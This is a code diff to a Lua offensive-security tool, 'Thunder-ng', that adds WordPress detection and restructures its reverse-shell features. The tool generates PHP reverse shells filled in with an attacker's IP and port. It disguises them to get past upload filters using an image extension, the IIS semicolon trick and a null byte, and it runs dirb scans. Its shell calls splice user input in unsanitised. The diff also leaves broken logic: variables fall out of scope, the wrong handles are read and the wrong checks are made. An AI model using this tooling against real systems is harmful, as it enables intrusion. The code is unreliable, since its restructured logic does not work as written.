@@ -27,6 +27,7 @@ SOFTWARE.
 
 print("Welcome To Thunder-ng")
 -- Show the help menu if arg[2] is -h
+local http_request = require "http.request" -- The http lib
 function help()
 	if ( arg[1] == "-h" )
 	then
@@ -35,6 +36,7 @@ function help()
 		print("-exp 	| Search For available exploits based on version numbers scans")
 		print("--hidden | Search for hidden content usage [ lua main.lua --hidden <CMS name> ] or  [ lua main.lua --hidden raw]")
 		print("-rv      | Reverse Shell usage[ lua main.lua -rv --bypass to bypass file upload filter ] or [ -rv --generator to generate a php reverse shell]")
+		print("-cms     | Cms stuff usage [ lua main.lua -cms --detect to detect cms used in the target ]")
 	elseif ( arg[1] == nil or arg[1] == '' )
 	then
 		print("Help Menu:")
@@ -72,11 +74,11 @@ function hidden_content_hunt()
 		then
 			local wordlist = "wordlists/common.txt"
 			local dirb_scan = os.execute("dirb http://" .. ip .. " " .. wordlist .. " | grep -e \"200\" -e \"DIRECTORY\" > results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt && cat results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt")
-			print("[*] Saved to results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt")	
+			print("[*] Saved to results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt")
 		else
 			local wordlist = i
 			local dirb_scan = os.execute("dirb http://" .. ip .. " " .. wordlist .. " | grep -e \"200\" -e \"DIRECTORY\" > results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt && cat results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt")
-			print("[*] Saved to results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt")	
+			print("[*] Saved to results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt")
 		end
 
 	elseif ( arg[1] == "--hidden" and arg[2] == "drupal")
@@ -96,44 +98,45 @@ function hidden_content_hunt()
 	end
 end
 function reverse_shell()
-	if ( arg[1] == "-rv" and arg[2] == "--bypass" )
+if ( arg[1] == "-rv" and arg[2] == "--bypass" )
 	then
-		print("Select what you want to byass file upload on")
-		print("1-PHP")
-		io.write("->: ")
-		local i = io.read()
-		if ( i == "1" ) 
-		then
-			print("Please The path to you reverse shell")
-			io.write("->: ")
-			local reverse_shell_path = io.read()
-			print("Select which Method you want to use : ")
-			print("1-Change File extension To an image")
-			print("2-IIS 6 semi-colon bypass")
-			print("3-null character injection")
-			print("4-Change Exif data (Soon)")
+			print("Select what you want to byass file upload on")
+			print("1-PHP")
 			io.write("->: ")
 			local i = io.read()
 			if ( i == "1" )
-			then
-				os.execute("mv " .. reverse_shell_path .. " results/" .. reverse_shell_path .. ".jpg")
-				print("[*] Payload was saved to results/" .. reverse_shell_path .. ".jpg")
-			end
-			if ( i == "2" )
-			then
-				os.execute("mv " .. reverse_shell_path .. " results/" .. "'" ..reverse_shell_path .. "'" .. "';.jpg'")
-				print("[*] Payload was saved to results/" .. reverse_shell_path .. "';.jpg'")
-			end
-			if ( i == "3" )
-			then
-				os.execute("mv " .. reverse_shell_path .. " results/" .. "'" .. reverse_shell_path .. "'" .. "'%00.jpg'" )
-				print("[*] Payload was saved to results/" .. "'" .. reverse_shell_path .. "'" .. "'%00.jpg'")
-			end
-		end
-	end	
-	if ( arg[1] == "-rv" and arg[2] == "--generator" )
+				then
+					print("Please The path to you reverse shell")
+					io.write("->: ")
+					local reverse_shell_path = io.read()
+					print("Select which Method you want to use : ")
+					print("1-Change File extension To an image")
+					print("2-IIS 6 semi-colon bypass")
+					print("3-null character injection")
+					print("4-Change Exif data (Soon)")
+					io.write("->: ")
+					local i = io.read()
+				end
+				if ( i == "1" )
+					then
+						os.execute("mv " .. reverse_shell_path .. " results/" .. reverse_shell_path .. ".jpg")
+						print("[*] Payload was saved to results/" .. reverse_shell_path .. ".jpg")
+					end
+				if ( i == "2" )
+					then
+						os.execute("mv " .. reverse_shell_path .. " results/" .. "'" ..reverse_shell_path .. "'" .. "';.jpg'")
+						print("[*] Payload was saved to results/" .. reverse_shell_path .. "';.jpg'")
+					end
+				if ( i == "3" )
+					then
+						os.execute("mv " .. reverse_shell_path .. " results/" .. "'" .. reverse_shell_path .. "'" .. "'%00.jpg'" )
+						print("[*] Payload was saved to results/" .. "'" .. reverse_shell_path .. "'" .. "'%00.jpg'")
+					end
+				end
+	end
+if ( arg[1] == "-rv" and arg[2] == "--generator" )
 	then
-		print("Please give your ip address (If your attack is local give your local address else give your public ip)")
+		print("Please give your ip address (If your attack is local give your  address else give your public ip)")
 		io.write("->: ")
 		ip   = io.read()
 		print("Please provide a port number")
@@ -145,10 +148,70 @@ function reverse_shell()
 		os.execute("sed -i \'49s/.*/$ip = " .. "'" .. ip .. "'" .. ";/\' reverse_shells/php-reverse-shell.php && " .. " sed -i \'50s/.*/$port = " .. "'" .. port .. "'" .. ";/\' reverse_shells/php-reverse-shell.php && cat reverse_shells/php-reverse-shell.php > " .. path)
 		print("[:)] Done!")
 		print("[*] Saved to " .. path )
+	end
+function cms_detect()
+	if ( arg[1] == "-cms" and arg[2] == "--detect" ) then
+					print("Please give your target web address ex \"https://example.com\" ")
+					io.write("->: ")
+					ip = io.read()
+					-- First try searching for Wordpress in source code
+					local headers, stream = assert(http_request.new_from_uri(ip):go())
+					if headers:get ":status" == "200" then
+    				print("[*] Target is alive")
+						print("[*] Getting source code ...")
+						local body = assert(stream:get_body_as_string())
+						temp = assert(io.open("temp", "w"))
+						temp:write(body)
+						temp:close()
+						wp_grep = assert(io.popen("grep wordpress temp", "r"))
+						wp_grepOutput = assert(wp_grep:read('*all'))
+						if string.len(wp_grepOutput) > 0 then -- I konw it seems like a lot but i'm trying to make the code readble
+								found_wp = true
+							else
+								print("Can't find Wordpress in source code")
+								found_wp = false
+						end
+						if found_wp == true then
+							print("[*] Found Wordpress in the source code !")
+						end
+						-- get to next method if found_wp is false
+						if found_wp == false then
+							wp_content_grep = assert(io.popen("grep wp-content temp", "r"))
+							wp_content_grepOutput = assert(wp_grep:read('*all'))
+							if string.len(wp_content_grepOutput) > 0 then
+									found_wp_content = true
+								else
+									print("Can't find wp-content in source code")
+									found_wp_content = false
+							end
+							if found_wp_content == true then
+								print("[*] Found wp-content in the source code !")
+							end
+							if found_wp == false then
+								local headers, stream = assert(http_request.new_from_uri(ip .. "/robots.txt"):go())
+								print("[/\\] Requesting " .. ip .. "/robots.txt")
+								if headers:get ":status" == "200" then
+									print("[*] There is a robots.txt lemme fetch it")
+									robots_grep = assert(io.popen("grep wp-admin temp", "r"))
+									robots_grepOutput = assert(robots_grep:read('*all'))
+									if string.len(wp_grepOutput) > 0 then
+											found_wp_admin = true
+										else
+											print("Can't find wp-admin in robots.txt")
+											found_wp_admin = false
+									end
+									if found_wp_admin == true then
+										print("[*] Found wp-admin in the robots.txt !")
+									end
+								end
 
+							end
+						end
+					end
 	end
 end
 help()
 exploits_searcher()
 hidden_content_hunt()
 reverse_shell()
+cms_detect()
